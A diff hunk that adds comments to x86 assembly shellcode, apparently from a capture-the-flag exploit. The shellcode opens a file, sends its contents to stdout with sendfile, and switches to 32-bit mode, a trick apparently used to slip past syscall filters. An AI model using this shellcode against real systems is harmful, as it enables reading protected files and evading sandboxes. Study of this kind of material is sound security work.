@@ -15,10 +15,10 @@ mov rsp, 0x1337500
     mov eax, 5
     int 0x80
     mov ebx, 1
-    mov ecx, eax
+    mov ecx, eax  //the return value of last syscall 5 (open) will saved in eax
     mov edx, 0
     mov esi, 0x3e8
-    mov eax, 0xbb
+    mov eax, 0xbb  //call sendfile from eax to 1(stdout)
     int 0x80
 to32:
     mov dword ptr [rsp + 4], 0x23
